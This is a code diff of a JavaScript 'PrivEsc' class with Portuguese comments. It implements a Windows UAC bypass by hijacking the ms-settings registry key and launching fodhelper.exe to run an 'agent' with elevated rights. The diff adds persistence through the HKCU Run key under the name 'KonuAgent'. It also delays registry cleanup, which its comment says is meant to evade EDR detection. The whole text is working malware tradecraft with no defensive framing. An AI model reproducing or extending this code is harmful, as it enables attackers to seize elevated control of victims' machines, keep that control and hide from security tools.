@@ -64,25 +64,24 @@ class PrivEsc {
         const delegateValue = this.agentPath;
 
         try {
-            // 1. Cria a chave de comando do ms-settings
+            // 1. Configura o hijack do ms-settings
             execSync(`reg add "${registryPath}" /v "DelegateExecute" /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });
-            
-            // 2. Remove a chave 'DelegateExecute' para forçar o Windows a ler o valor padrão (default)
-            // Isso é necessário para que o bypass funcione em versões recentes do Windows 10/11
             execSync(`reg delete "${registryPath}" /v "DelegateExecute" /f`, { stdio: 'ignore' });
-
-            // 3. Define o valor padrão da chave para o caminho do nosso agente
             execSync(`reg add "${registryPath}" /ve /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });
 
-            // 4. Executa o fodhelper para disparar a elevação
+            // 2. Dispara a elevação via fodhelper
             execSync('cmd.exe /c start fodhelper.exe', { stdio: 'ignore' });
 
-            // 5. Limpeza rápida do registro para não deixar rastros óbvios
+            // 3. Persistência: Adiciona o agente ao startup para manter o acesso
+            const runKey = `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
+            execSync(`reg add "${runKey}" /v "KonuAgent" /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });
+
+            // 4. Limpeza agendada do registro para evitar detecção de EDR
             setTimeout(() => {
                 try {
                     execSync(`reg delete "${registryPath}" /f`, { stdio: 'ignore' });
                 } catch (e) {}
-            }, 5000);
+            }, 10000);
 
             return true;
         } catch (e) {
